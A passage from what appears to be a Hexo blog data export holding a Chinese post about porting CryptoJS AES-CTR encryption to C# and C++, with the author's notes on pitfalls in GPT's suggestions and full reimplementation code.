0;\n        if (1 != EVP_DigestFinal_ex(mdctx, output, &len)) {\n            std::cerr << \"Error finalizing digest.\" << std::endl;\n            EVP_MD_CTX_free(mdctx);\n            return;\n        }\n\n        EVP_MD_CTX_free(mdctx);\n    }\n\n\n  \n    std::string base64_encode(\n        const unsigned char* input, size_t length\n    ) {\n        BIO* bio;\n        BIO* b64;\n        BUF_MEM* bufferPtr;\n\n        b64 = BIO_new(BIO_f_base64());\n        bio = BIO_new(BIO_s_mem());\n        BIO_push(b64, bio);\n        BIO_write(b64, input, length);\n        BIO_flush(b64);\n        BIO_get_mem_ptr(b64, &bufferPtr);\n\n        std::string result(bufferPtr->data, bufferPtr->length);\n\n        BIO_free_all(b64);\n\n        return result;\n    }\n\n\n    std::string generate_key_from_secret(\n        const std::string& secretKey\n    ) {\n        std::string salt = \"one-deep\"; \n        std::string combined = secretKey + salt;  \n\n   \n        unsigned char hash[SHA256_DIGEST_LENGTH];\n        calculate_sha256(combined, hash);\n\n    \n        std::string base64Hash = base64_encode(hash, SHA256_DIGEST_LENGTH);\n\n        return base64Hash.substr(0, 32);\n    }\n    std::vector<unsigned char> EVP_BytesToKey_MD5_EVP(\n        const std::string& password,\n        const std::vector<unsigned char>& salt,\n        int key_iv_len\n    ) {\n        std::vector<unsigned char> result;\n        std::vector<unsigned char> prev;\n\n        while ((int)result.size() < key_iv_len) {\n            EVP_MD_CTX* mdctx = EVP_MD_CTX_new();\n            EVP_DigestInit_ex(mdctx, EVP_md5(), nullptr);\n\n            if (!prev.empty())\n                EVP_DigestUpdate(mdctx, prev.data(), prev.size());\n\n            EVP_DigestUpdate(mdctx, password.data(), password.size());\n            EVP_DigestUpdate(mdctx, salt.data(), salt.size());\n\n            unsigned char md[EVP_MAX_MD_SIZE];\n            unsigned int md_len = 0;\n            EVP_DigestFinal_ex(mdctx, md, &md_len);\n\n            EVP_MD_CTX_free(mdctx);\n\n            prev.assign(md, md + md_len);\n            result.insert(result.end(), md, md + md_len);\n        }\n\n        result.resize(key_iv_len);\n        return result;\n    }\n\n    std::vector<unsigned char> base64Decode(\n        const std::string& input\n    ) {\n        BIO* bio, * b64;\n        int decodeLen = (input.length() * 3) / 4;\n        std::vector<unsigned char> buffer(decodeLen);\n\n        bio = BIO_new_mem_buf(input.data(), input.length());\n        b64 = BIO_new(BIO_f_base64());\n        BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); \n        bio = BIO_push(b64, bio);\n\n        int length = BIO_read(bio, buffer.data(), input.length());\n        buffer.resize(length);\n\n        BIO_free_all(bio);\n        return buffer;\n    }\n\n\n\n    std::vector<unsigned char> aes256_ctr_decrypt(\n        const std::vector<unsigned char>& ciphertext,\n        const std::vector<unsigned char>& key,\n        const std::vector<unsigned char>& iv\n    ) {\n        std::vector<unsigned char> plaintext(ciphertext.size());\n\n        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n        EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key.data(), iv.data());\n\n        int out_len1 = (int)plaintext.size();\n        EVP_DecryptUpdate(ctx, plaintext.data(), &out_len1, ciphertext.data(), (int)ciphertext.size());\n\n        int out_len2;\n        EVP_DecryptFinal_ex(ctx, plaintext.data() + out_len1, &out_len2);\n        plaintext.resize(out_len1 + out_len2);\n\n        EVP_CIPHER_CTX_free(ctx);\n        return plaintext;\n    }\n    std::vector<unsigned char> remove_pkcs7_padding(const std::vector<unsigned char>& data) {\n        if (data.empty()) return data;\n        unsigned char pad_len = data.back();\n        if (pad_len == 0 || pad_len > 16) return data;  \n        for (size_t i = data.size() - pad_len; i < data.size(); i++) {\n            if (data[i] != pad_len) return data;  \n        }\n        return std::vector<unsigned char>(data.begin(), data.end() - pad_len);\n    }\n    void 解密(\n        std::string& secretKey,\n        std::string& b64\n    )\n    {\n        std::string password = generate_key_from_secret(secretKey);\n\n        std::cout << \"Key: \" << password << std::endl;\n\n        auto decoded = base64Decode(b64);\n\n    \n        if (decoded.size() < 16 || std::string(decoded.begin(), decoded.begin() + 8) != \"Salted__\") {\n            std::cerr << \"Not a salted OpenSSL format.\" << std::endl;\n        }\n\n        std::vector<unsigned char> salt(decoded.begin() + 8, decoded.begin() + 16);\n        std::vector<unsigned char> ciphertext(decoded.begin() + 16, decoded.end());\n\n        std::cout << \"Salt: \";\n        for (auto c : salt) printf(\"%02X\", c);\n        std::cout << std::endl;\n\n      \n        int key_len = 32;\n        int iv_len = 16;\n        auto key_iv = EVP_BytesToKey_MD5_EVP(password, salt, key_len + iv_len); \n\n\n\n        std::vector<unsigned char> key(key_iv.begin(), key_iv.begin() + key_len);\n        std::vector<unsigned char> iv(key_iv.begin() + key_len, key_iv.end());\n\n        std::cout << \"Key: \";\n        for (auto c : key) printf(\"%02X\", c);\n        std::cout << \"\\nIV: \";\n        for (auto c : iv) printf(\"%02X\", c);\n        std::cout << std::endl;\n\n        auto plaintext_with_padding = aes256_ctr_decrypt(ciphertext, key, iv);\n        auto plaintext = remove_pkcs7_padding(plaintext_with_padding);\n        std::cout << \"Decrypted: \";\n        for (auto c : plaintext) std::cout << c;\n        std::cout << std::endl;\n    }\n\n    std::vector<unsigned char> aes256_ctr_encrypt(\n        const std::vector<unsigned char>& plaintext,\n        const std::vector<unsigned char>& key,\n        const std::vector<unsigned char>& iv\n    ) {\n        std::vector<unsigned char> ciphertext(plaintext.size());\n\n        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n        EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key.data(), iv.data());\n\n        int out_len1 = (int)ciphertext.size();\n        EVP_EncryptUpdate(ctx, ciphertext.data(), &out_len1, plaintext.data(), (int)plaintext.size());\n\n        int out_len2;\n        EVP_EncryptFinal_ex(ctx, ciphertext.data() + out_len1, &out_len2);\n        ciphertext.resize(out_len1 + out_len2);\n\n        EVP_CIPHER_CTX_free(ctx);\n        return ciphertext;\n    }\n\n    std::string 加密(\n        const std::string& plaintext_str,\n        const std::string& secretKey\n    ) {\n        std::string password = generate_key_from_secret(secretKey);\n\n    \n        std::vector<unsigned char> salt(8);\n        if (!RAND_bytes(salt.data(), 8)) {\n            std::cerr << \"Failed to generate salt.\" << std::endl;\n            return \"\";\n        }\n\n   \n        int key_len = 32;\n        int iv_len = 16;\n        auto key_iv = EVP_BytesToKey_MD5_EVP(password, salt, key_len + iv_len);\n        std::vector<unsigned char> key(key_iv.begin(), key_iv.begin() + key_len);\n        std::vector<unsigned char> iv(key_iv.begin() + key_len, key_iv.end());\n\n        std::vector<unsigned char> plaintext(plaintext_str.begin(), plaintext_str.end());\n        size_t padding_len = 16 - (plaintext.size() % 16);\n        if (padding_len == 0) padding_len = 16;\n        plaintext.insert(plaintext.end(), padding_len, static_cast<unsigned char>(padding_len));\n        auto ciphertext = aes256_ctr_encrypt(plaintext, key, iv);\n\n       \n        std::vector<unsigned char> openssl_format;\n        openssl_format.insert(openssl_format.end(), { 'S','a','l','t','e','d','_','_' });\n        openssl_format.insert(openssl_format.end(), salt.begin(), salt.end());\n        openssl_format.insert(openssl_format.end(), ciphertext.begin(), ciphertext.end());\n\n        return base64_encode(openssl_format.data(), openssl_format.size());\n    }","source":"_posts/還原cryptojs採坑紀錄.md","raw":"---\ntitle: 還原cryptojs AES-CTR採坑紀錄\ndate: 2025-05-29 11:56:33\ntags:\n---\n\n\n我原本 以為C++和C#還原cryptojs丟入GPT就能解出算法\n\n    function encrypt(message, secretKey) {\n        var hash = CryptoJS.SHA256(secretKey + 'one-deep');\n        var key = hash.toString(CryptoJS.enc.Base64).substr(0, 32);\n\n        hash = CryptoJS.SHA256(secretKey.substr(0, 16));\n        var ive = hash.toString(CryptoJS.enc.Base64).substr(0, 16);\n\n        var options = { iv: ive, mode: CryptoJS.mode.CTR };\n        var enc = CryptoJS.AES.encrypt(message, key, options);\n        return enc.toString();\n    }\n\n\n後來  我只好去研究cryptojs底層實踐\n<span style=\"color:blue\">#第一坑</span>\nGPT的 回答的AES256_CTR_Encrypt 的加密 \n沒有 node_modules/crypto-js/evpkdf.js中的\n\n    cfg: Base.extend({\n        keySize: 128/32,\n        hasher: MD5,\n        iterations: 1\n    }),\n\n此乃大坑之一也\n\n<span style=\"color:blue\">#第二坑</span>\nGPT常用OpenSSL 3.0之前的舊版本的非EVP  舊函數 導致代碼執行不能\n類似於AES_encrypt()\nMD5_Init() / SHA256_Init() /HMAC()\n我網路上查很多資料都沒有 我草大坑\n\n\n<span style=\"color:blue\">#第三坑</span>\n\nCRYPTOJS 雖然他沒有直說\n但他  有用 PKCS7 填充\n如果未滿足1 Chunk的 數據 會進行填充\n尼瑪的 我原本只加解密大於1 Chunk 但當我加解密{} 空數據\n直接故障報錯\n\n\n\n<span style=\"color:green\">最後附上我的完整代碼</span>\n\n<span style=\"color:red;\">C#版本</span>\n        \n    public class OpenSSL_AES_CTR\n    {\n        public static string GenerateKeyFromSecret(string secretKey)\n        {\n            string salt = \"one-deep\";\n            string combined = secretKey + salt;\n\n            using (SHA256 sha256 = SHA256.Create())\n            {\n                byte[] hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(combined));\n                string base64 = Convert.ToBase64String(hash);\n                return base64.Substring(0, 32);\n            }\n        }\n\n        public static byte[] EVP_BytesToKey_MD5(string password, byte[] salt, int keyIvLength)\n        {\n            using (var md5 = MD5.Create())\n            {\n                MemoryStream result = new MemoryStream();\n                byte[] prev = new byte[0];\n\n                while (result.Length < keyIvLength)\n                {\n                    byte[] data = new byte[prev.Length + password.Length + salt.Length];\n                    Buffer.BlockCopy(prev, 0, data, 0, prev.Length);\n                    Buffer.BlockCopy(Encoding.UTF8.GetBytes(password), 0, data, prev.Length, password.Length);\n                    Buffer.BlockCopy(salt, 0, data, prev.Length + password.Length, salt.Length);\n\n                    prev = md5.ComputeHash(data);\n                    result.Write(prev, 0, prev.Length);\n                }\n\n                byte[] buffer = result.ToArray();\n                Array.Resize(ref buffer, keyIvLength);\n                return buffer;\n            }\n        }\n\n        public static byte[] AES256_CTR_Encrypt(byte[] plaintext, byte[] key, byte[] iv)\n        {\n            using (Aes aes = Aes.Create())\n            {\n                aes.Mode = CipherMode.ECB; \n                aes.Padding = PaddingMode.None;\n                aes.Key = key;\n\n                using (var encryptor = aes.CreateEncryptor())\n                {\n                    byte[] ciphertext = new byte[plaintext.Length];\n                    byte[] counter = (byte[])iv.Clone();\n                    byte[] keystreamBlock = new byte[16];\n                    for (int i = 0; i < plaintext.Length; i += 16)\n                    {\n                        keystreamBlock = encryptor.TransformFinalBlock(counter, 0, 16);\n\n                        for (int j = 0; j < 16 && (i + j) < plaintext.Length; ++j)\n                            ciphertext[i + j] = (byte)(plaintext[i + j] ^ keystreamBlock[j]);\n\n                        \n                        for (int j = 15; j >= 0; j--)\n                        {\n                            if (++counter[j] != 0)\n                                break;\n                        }\n                    }\n\n                    return ciphertext;\n                }\n            }\n        }\n\n        public static byte[] AES256_CTR_Decrypt(byte[] ciphertext, byte[] key, byte[] iv)\n        {\n           \n            return AES256_CTR_Encrypt(ciphertext, key, iv);\n        }\n        public static byte[] PKCS7Pad(byte[] data)\n        {\n            int blockSize = 16;\n            int paddingLen = blockSize - (data.Length % blockSize);\n            if (paddingLen == 0) paddingLen = blockSize;\n\n            byte[] padded = new byte[data.Length + paddingLen];\n            Buffer.BlockCopy(data, 0, padded, 0, data.Length);\n            for (int i = data.Length; i < padded.Length; i++)\n                padded[i] = (byte)paddingLen;\n\n            return padded;\n        }\n\n        public static byte[] PKCS7Unpad(byte[] data)\n        {\n            if (data.Length == 0) return data;\n            int paddingLen = data[data.Length - 1];\n            if (paddingLen <= 0 || paddingLen > 16) return data;\n\n            for (int i = data.Length - paddingLen; i < data.Length; i++)\n            {\n                if (data[i] != paddingLen)\n                    return data;  \n            }\n\n            byte[] unpadded = new byte[data.Length - paddingLen];\n            Buffer.BlockCopy(data, 0, unpadded, 0, unpadded.Length);\n            return unpadded;\n        }\n\n        public static string Encrypt(string plaintext, string secretKey)\n        {\n            string password = GenerateKeyFromSecret(secretKey);\n\n            byte[] salt = new byte[8];\n            RandomNumberGenerator.Fill(salt);\n\n            byte[] keyIv = EVP_BytesToKey_MD5(password, salt, 32 + 16);\n            byte[] key = new byte[32];\n            byte[] iv = new byte[16];\n            Buffer.BlockCopy(keyIv, 0, key, 0, 32);\n            Buffer.BlockCopy(keyIv, 32, iv, 0, 16);\n\n            byte[] pt = Encoding.UTF8.GetBytes(plaintext);\n            pt = PKCS7Pad(pt);\n            byte[] encrypted = AES256_CTR_Encrypt(pt, key, iv);\n\n\n\n            using (MemoryStream ms = new MemoryStream())\n            {\n                byte[] prefix = Encoding.ASCII.GetBytes(\"Salted__\");\n                ms.Write(prefix, 0, prefix.Length);\n                ms.Write(salt, 0, salt.Length);\n                ms.Write(encrypted, 0, encrypted.Length);\n\n                return Convert.ToBase64String(ms.ToArray());\n            }\n        }\n\n        public static string Decrypt(string b64, string secretKey)\n        {\n            byte[] data = Convert.FromBase64String(b64);\n            if (data.Length < 16 || Encoding.ASCII.GetString(data, 0, 8) != \"Salted__\")\n                throw new Exception(\"Invalid format: not salted OpenSSL.\");\n\n            byte[] salt = new byte[8];\n            Array.Copy(data, 8, salt, 0, 8);\n            byte[] ciphertext = new byte[data.Length - 16];\n            Array.Copy(data, 16, ciphertext, 0, ciphertext.Length);\n\n            string password = GenerateKeyFromSecret(secretKey);\n            byte[] keyIv = EVP_BytesToKey_MD5(password, salt, 32 + 16);\n            byte[] key = new byte[32];\n            byte[] iv = new byte[16];\n            Buffer.BlockCopy(keyIv, 0, key, 0, 32);\n            Buffer.BlockCopy(keyIv, 32, iv, 0, 16);\n\n            byte[] decrypted = AES256_CTR_Decrypt(ciphertext, key, iv);\n            decrypted = PKCS7Unpad(decrypted);\n            return Encoding.UTF8.GetString(decrypted);\n\n        }\n    }\n\n\n\n <span style=\"color:red;\">C++版本</span>\n\n\n    #include <openssl/rand.h>\n    #include <iostream>\n    #include <string>\n    #include <vector>\n    #include <openssl/evp.h>\n    #include <openssl/sha.h>\n    #include <openssl/bio.h>\n    #include <openssl/buffer.h>\n    #include <iomanip>\n    #include <openssl/md5.h>\n    #include <openssl/aes.h>\n    #include <cstring>\n    void calculate_sha256(\n        const std::string& input, \n        unsigned char* output\n    ) {\n        EVP_MD_CTX* mdctx = EVP_MD_CTX_new();\n        if (mdctx == nullptr) {\n            std::cerr << \"Error creating EVP_MD_CTX.\" << std::endl;\n            return;\n        }\n\n     \n        if (1 != EVP_DigestInit_ex(mdctx, EVP_sha256(), nullptr)) {\n            std::cerr << \"Error initializing digest.\" << std::endl;\n            EVP_MD_CTX_free(mdctx);\n            return;\n        }\n\n \n        if (1 != EVP_DigestUpdate(mdctx, input.c_str(), input.length())) {\n            std::cerr << \"Error updating digest.\" << std::endl;\n            EVP_MD_CTX_free(mdctx);\n            return;\n        }\n\n        \n        unsigned int len = 0;\n        if (1 != EVP_DigestFinal_ex(mdctx, output, &len)) {\n            std::cerr << \"Error finalizing digest.\" << std::endl;\n            EVP_MD_CTX_free(mdctx);\n            return;\n        }\n\n        EVP_MD_CTX_free(mdctx);\n    }\n\n\n  \n    std::string base64_encode(\n        const unsigned char* input, size_t length\n    ) {\n        BIO* bio;\n        BIO* b64;\n        BUF_MEM* bufferPtr;\n\n        b64 = BIO_new(BIO_f_base64());\n        bio = BIO_new(BIO_s_mem());\n        BIO_push(b64, bio);\n        BIO_write(b64, input, length);\n        BIO_flush(b64);\n        BIO_get_mem_ptr(b64, &bufferPtr);\n\n        std::string result(bufferPtr->data, bufferPtr->length);\n\n        BIO_free_all(b64);\n\n        return result;\n    }\n\n\n    std::string generate_key_from_secret(\n        const std::string& secretKey\n    ) {\n        std::string salt = \"one-deep\"; \n        std::string combined = secretKey + salt;  \n\n   \n        unsigned char hash[SHA256_DIGEST_LENGTH];\n        calculate_sha256(combined, hash);\n\n    \n        std::string base64Hash = base64_encode(hash, SHA256_DIGEST_LENGTH);\n\n        return base64Hash.substr(0, 32);\n    }\n    std::vector<unsigned char> EVP_BytesToKey_MD5_EVP(\n        const std::string& password,\n        const std::vector<unsigned char>& salt,\n        int key_iv_len\n    ) {\n        std::vector<unsigned char> result;\n        std::vector<unsigned char> prev;\n\n        while ((int)result.size() < key_iv_len) {\n            EVP_MD_CTX* mdctx = EVP_MD_CTX_new();\n            EVP_DigestInit_ex(mdctx, EVP_md5(), nullptr);\n\n            if (!prev.empty())\n                EVP_DigestUpdate(mdctx, prev.data(), prev.size());\n\n            EVP_DigestUpdate(mdctx, password.data(), password.size());\n            EVP_DigestUpdate(mdctx, salt.data(), salt.size());\n\n            unsigned char md[EVP_MAX_MD_SIZE];\n            unsigned int md_len = 0;\n            EVP_DigestFinal_ex(mdctx, md, &md_len);\n\n            EVP_MD_CTX_free(mdctx);\n\n            prev.assign(md, md + md_len);\n            result.insert(result.end(), md, md + md_len);\n        }\n\n        result.resize(key_iv_len);\n        return result;\n    }\n\n    std::vector<unsigned char> base64Decode(\n        const std::string& input\n    ) {\n        BIO* bio, * b64;\n        int decodeLen = (input.length() * 3) / 4;\n        std::vector<unsigned char> buffer(decodeLen);\n\n        bio = BIO_new_mem_buf(input.data(), input.length());\n        b64 = BIO_new(BIO_f_base64());\n        BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); \n        bio = BIO_push(b64, bio);\n\n        int length = BIO_read(bio, buffer.data(), input.length());\n        buffer.resize(length);\n\n        BIO_free_all(bio);\n        return buffer;\n    }\n\n\n\n    std::vector<unsigned char> aes256_ctr_decrypt(\n        const std::vector<unsigned char>& ciphertext,\n        const std::vector<unsigned char>& key,\n        const std::vector<unsigned char>& iv\n    ) {\n        std::vector<unsigned char> plaintext(ciphertext.size());\n\n        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n        EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key.data(), iv.data());\n\n        int out_len1 = (int)plaintext.size();\n        EVP_DecryptUpdate(ctx, plaintext.data(), &out_len1, ciphertext.data(), (int)ciphertext.size());\n\n        int out_len2;\n        EVP_DecryptFinal_ex(ctx, plaintext.data() + out_len1, &out_len2);\n        plaintext.resize(out_len1 + out_len2);\n\n        EVP_CIPHER_CTX_free(ctx);\n        return plaintext;\n    }\n    std::vector<unsigned char> remove_pkcs7_padding(const std::vector<unsigned char>& data) {\n        if (data.empty()) return data;\n        unsigned char pad_len = data.back();\n        if (pad_len == 0 || pad_len > 16) return data;  \n        for (size_t i = data.size() - pad_len; i < data.size(); i++) {\n            if (data[i] != pad_len) return data;  \n        }\n        return std::vector<unsigned char>(data.begin(), data.end() - pad_len);\n    }\n    void 解密(\n        std::string& secretKey,\n        std::string& b64\n    )\n    {\n        std::string password = generate_key_from_secret(secretKey);\n\n        std::cout << \"Key: \" << password << std::endl;\n\n        auto decoded = base64Decode(b64);\n\n    \n        if (decoded.size() < 16 || std::string(decoded.begin(), decoded.begin() + 8) != \"Salted__\") {\n            std::cerr << \"Not a salted OpenSSL format.\" << std::endl;\n        }\n\n        std::vector<unsigned char> salt(decoded.begin() + 8, decoded.begin() + 16);\n        std::vector<unsigned char> ciphertext(decoded.begin() + 16, decoded.end());\n\n        std::cout << \"Salt: \";\n        for (auto c : salt) printf(\"%02X\", c);\n        std::cout << std::endl;\n\n      \n        int key_len = 32;\n        int iv_len = 16;\n        auto key_iv = EVP_BytesToKey_MD5_EVP(password, salt, key_len + iv_len); \n\n\n\n        std::vector<unsigned char> key(key_iv.begin(), key_iv.begin() + key_len);\n        std::vector<unsigned char> iv(key_iv.begin() + key_len, key_iv.end());\n\n        std::cout << \"Key: \";\n        for (auto c : key) printf(\"%02X\", c);\n        std::cout << \"\\nIV: \";\n        for (auto c : iv) printf(\"%02X\", c);\n        std::cout << std::endl;\n\n        auto plaintext_with_padding = aes256_ctr_decrypt(ciphertext, key, iv);\n        auto plaintext = remove_pkcs7_padding(plaintext_with_padding);\n        std::cout << \"Decrypted: \";\n        for (auto c : plaintext) std::cout << c;\n        std::cout << std::endl;\n    }\n\n    std::vector<unsigned char> aes256_ctr_encrypt(\n        const std::vector<unsigned char>& plaintext,\n        const std::vector<unsigned char>& key,\n        const std::vector<unsigned char>& iv\n    ) {\n        std::vector<unsigned char> ciphertext(plaintext.size());\n\n        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n        EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key.data(), iv.data());\n\n        int out_len1 = (int)ciphertext.size();\n        EVP_EncryptUpdate(ctx, ciphertext.data(), &out_len1, plaintext.data(), (int)plaintext.size());\n\n        int out_len2;\n        EVP_EncryptFinal_ex(ctx, ciphertext.data() + out_len1, &out_len2);\n        ciphertext.resize(out_len1 + out_len2);\n\n        EVP_CIPHER_CTX_free(ctx);\n        return ciphertext;\n    }\n\n    std::string 加密(\n        const std::string& plaintext_str,\n        const std::string& secretKey\n    ) {\n        std::string password = generate_key_from_secret(secretKey);\n\n    \n        std::vector<unsigned char> salt(8);\n        if (!RAND_bytes(salt.data(), 8)) {\n            std::cerr << \"Failed to generate salt.\" << std::endl;\n            return \"\";\n        }\n\n   \n        int key_len = 32;\n        int iv_len = 16;\n        auto key_iv = EVP_BytesToKey_MD5_EVP(password, salt, key_len + iv_len);\n        std::vector<unsigned char> key(key_iv.begin(), key_iv.begin() + key_len);\n        std::vector<unsigned char> iv(key_iv.begin() + key_len, key_iv.end());\n\n        std::vector<unsigned char> plaintext(plaintext_str.begin(), plaintext_str.end());\n        size_t padding_len = 16 - (plaintext.size() % 16);\n        if (padding_len == 0) padding_len = 16;\n        plaintext.insert(plaintext.end(), padding_len, static_cast<unsigned char>(padding_len));\n        auto ciphertext = aes256_ctr_encrypt(plaintext, key, iv);\n\n       \n        std::vector<unsigned char> openssl_format;\n        openssl_format.insert(openssl_format.end(), { 'S','a','l','t','e','d','_','_' });\n        openssl_format.insert(openssl_format.end(), salt.begin(), salt.end());\n        openssl_format.insert(openssl_format.end(), ciphertext.begin(), ciphertext.end());\n\n        return base64_encode(openssl_format.data(), openssl_format.size());\n    }","slug":"還原cryptojs採坑紀錄","published":1,"updated":"2025-05-29T04:39:25.289Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwae0017zrlr7ferg30d","content":"<p>我原本 以為C++和C#還原cryptojs丟入GPT就能解出算法</p>\n<pre><code>function encrypt(message, secretKey) &#123;\n    var hash = CryptoJS.SHA256(secretKey + &#39;one-deep&#39;);\n    var key = hash.toString(CryptoJS.enc.Base64).substr(0, 32);\n\n    hash = CryptoJS.SHA256(secretKey.substr(0, 16));\n    var ive = hash.toString(CryptoJS.enc.Base64).substr(0, 16);\n\n    var options = &#123; iv: ive, mode: CryptoJS.mode.CTR &#125;;\n    var enc = CryptoJS.AES.encrypt(message, key, options);\n    return enc.toString();\n&#125;\n</code></pre>\n<p>後來  我只好去研究cryptojs底層實踐<br><span style=\"color:blue\">#第一坑</span><br>GPT的 回答的AES256_CTR_Encrypt 的加密<br>沒有 node_modules&#x2F;crypto-js&#x2F;evpkdf.js中的</p>\n<pre><code>cfg: Base.extend(&#123;\n    keySize: 128/32,\n    hasher: MD5,\n    iterations: 1\n&#125;),\n</code></pre>\n<p>此乃大坑之一也</p>\n<p><span style=\"color:blue\">#第二坑</span><br>GPT常用OpenSSL 3.0之前的舊版本的非EVP  舊函數 導致代碼執行不能<br>類似於AES_encrypt()<br>MD5_Init() &#x2F; SHA256_Init() &#x2F;HMAC()<br>我網路上查很多資料都沒有 我草大坑</p>\n<p><span style=\"color:blue\">#第三坑</span></p>\n<p>CRYPTOJS 雖然他沒有直說<br>但他  有用 PKCS7 填充<br>如果未滿足1 Chunk的 數據 會進行填充<br>尼瑪的 我原本只加解密大於1 Chunk 但當我加解密{} 空數據<br>直接故障報錯</p>\n<p><span style=\"color:green\">最後附上我的完整代碼</span></p>\n<p><span style=\"color:red;\">C#版本</span></p>\n<pre><code>public class OpenSSL_AES_CTR\n&#123;\n    public static string GenerateKeyFromSecret(string secretKey)\n    &#123;\n        string salt = &quot;one-deep&quot;;\n        string combined = secretKey + salt;\n\n        using (SHA256 sha256 = SHA256.Create())\n        &#123;\n            byte[] hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(combined));\n            string base64 = Convert.ToBase64String(hash);\n            return base64.Substring(0, 32);\n        &#125;\n    &#125;\n\n    public static byte[] EVP_BytesToKey_MD5(string password, byte[] salt, int keyIvLength)\n    &#123;\n        using (var md5 = MD5.Create())\n        &#123;\n            MemoryStream result = new MemoryStream();\n            byte[] prev = new byte[0];\n\n            while (result.Length &lt; keyIvLength)\n            &#123;\n                byte[] data = new byte[prev.Length + password.Length + salt.Length];\n                Buffer.BlockCopy(prev, 0, data, 0, prev.Length);\n                Buffer.BlockCopy(Encoding.UTF8.GetBytes(password), 0, data, prev.Length, password.Length);\n                Buffer.BlockCopy(salt, 0, data, prev.Length + password.Length, salt.Length);\n\n                prev = md5.ComputeHash(data);\n                result.Write(prev, 0, prev.Length);\n            &#125;\n\n            byte[] buffer = result.ToArray();\n            Array.Resize(ref buffer, keyIvLength);\n            return buffer;\n        &#125;\n    &#125;\n\n    public static byte[] AES256_CTR_Encrypt(byte[] plaintext, byte[] key, byte[] iv)\n    &#123;\n        using (Aes aes = Aes.Create())\n        &#123;\n            aes.Mode = CipherMode.ECB; \n            aes.Padding = PaddingMode.None;\n            aes.Key = key;\n\n            using (var encryptor = aes.CreateEncryptor())\n            &#123;\n                byte[] ciphertext = new byte[plaintext.Length];\n                byte[] counter = (byte[])iv.Clone();\n                byte[] keystreamBlock = new byte[16];\n                for (int i = 0; i &lt; plaintext.Length; i += 16)\n                &#123;\n                    keystreamBlock = encryptor.TransformFinalBlock(counter, 0, 16);\n\n                    for (int j = 0; j &lt; 16 &amp;&amp; (i + j) &lt; plaintext.Length; ++j)\n                        ciphertext[i + j] = (byte)(plaintext[i + j] ^ keystreamBlock[j]);\n\n                    \n                    for (int j = 15; j &gt;= 0; j--)\n                    &#123;\n                        if (++counter[j] != 0)\n                            break;\n                    &#125;\n                &#125;\n\n                return ciphertext;\n            &#125;\n        &#125;\n    &#125;\n\n    public static byte[] AES256_CTR_Decrypt(byte[] ciphertext, byte[] key, byte[] iv)\n    &#123;\n       \n        return AES256_CTR_Encrypt(ciphertext, key, iv);\n    &#125;\n    public static byte[] PKCS7Pad(byte[] data)\n    &#123;\n        int blockSize = 16;\n        int paddingLen = blockSize - (data.Length % blockSize);\n        if (paddingLen == 0) paddingLen = blockSize;\n\n        byte[] padded = new byte[data.Length + paddingLen];\n        Buffer.BlockCopy(data, 0, padded, 0, data.Length);\n        for (int i = data.Length; i &lt; padded.Length; i++)\n            padded[i] = (byte)paddingLen;\n\n        return padded;\n    &#125;\n\n    public static byte[] PKCS7Unpad(byte[] data)\n    &#123;\n        if (data.Length == 0) return data;\n        int paddingLen = data[data.Length - 1];\n        if (paddingLen &lt;= 0 || paddingLen &gt; 16) return data;\n\n        for (int i = data.Length - paddingLen; i &lt; data.Length; i++)\n        &#123;\n            if (data[i] != paddingLen)\n                return data;  \n        &#125;\n\n        byte[] unpadded = new byte[data.Length - paddingLen];\n        Buffer.BlockCopy(data, 0, unpadded, 0, unpadded.Length);\n        return unpadded;\n    &#125;\n\n    public static string Encrypt(string plaintext, string secretKey)\n    &#123;\n        string password = GenerateKeyFromSecret(secretKey);\n\n        byte[] salt = new byte[8];\n        RandomNumberGenerator.Fill(salt);\n\n        byte[] keyIv = EVP_BytesToKey_MD5(password, salt, 32 + 16);\n        byte[] key = new byte[32];\n        byte[] iv = new byte[16];\n        Buffer.BlockCopy(keyIv, 0, key, 0, 32);\n        Buffer.BlockCopy(keyIv, 32, iv, 0, 16);\n\n        byte[] pt = Encoding.UTF8.GetBytes(plaintext);\n        pt = PKCS7Pad(pt);\n        byte[] encrypted = AES256_CTR_Encrypt(pt, key, iv);\n\n\n\n        using (MemoryStream ms = new MemoryStream())\n        &#123;\n            byte[] prefix = Encoding.ASCII.GetBytes(&quot;Salted__&quot;);\n            ms.Write(prefix, 0, prefix.Length);\n            ms.Write(salt, 0, salt.Length);\n            ms.Write(encrypted, 0, encrypted.Length);\n\n            return Convert.ToBase64String(ms.ToArray());\n        &#125;\n    &#125;\n\n    public static string Decrypt(string b64, string secretKey)\n    &#123;\n        byte[] data = Convert.FromBase64String(b64);\n        if (data.Length &lt; 16 || Encoding.ASCII.GetString(data, 0, 8) != &quot;Salted__&quot;)\n            throw new Exception(&quot;Invalid format: not salted OpenSSL.&quot;);\n\n        byte[] salt = new byte[8];\n        Array.Copy(data, 8, salt, 0, 8);\n        byte[] ciphertext = new byte[data.Length - 16];\n        Array.Copy(data, 16, ciphertext, 0, ciphertext.Length);\n\n        string password = GenerateKeyFromSecret(secretKey);\n        byte[] keyIv = EVP_BytesToKey_MD5(password, salt, 32 + 16);\n        byte[] key = new byte[32];\n        byte[] iv = new byte[16];\n        Buffer.BlockCopy(keyIv, 0, key, 0, 32);\n        Buffer.BlockCopy(keyIv, 32, iv, 0, 16);\n\n        byte[] decrypted = AES256_CTR_Decrypt(ciphertext, key, iv);\n        decrypted = PKCS7Unpad(decrypted);\n        return Encoding.UTF8.GetString(decrypted);\n\n    &#125;\n&#125;\n</code></pre>\n<p> <span style=\"color:red;\">C++版本</span></p>\n<pre><code>#include &lt;openssl/rand.h&gt;\n#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n#include &lt;openssl/evp.h&gt;\n#include &lt;openssl/sha.h&gt;\n#include &lt;openssl/bio.h&gt;\n#include &lt;openssl/buffer.h&gt;\n#include &lt;iomanip&gt;\n#include 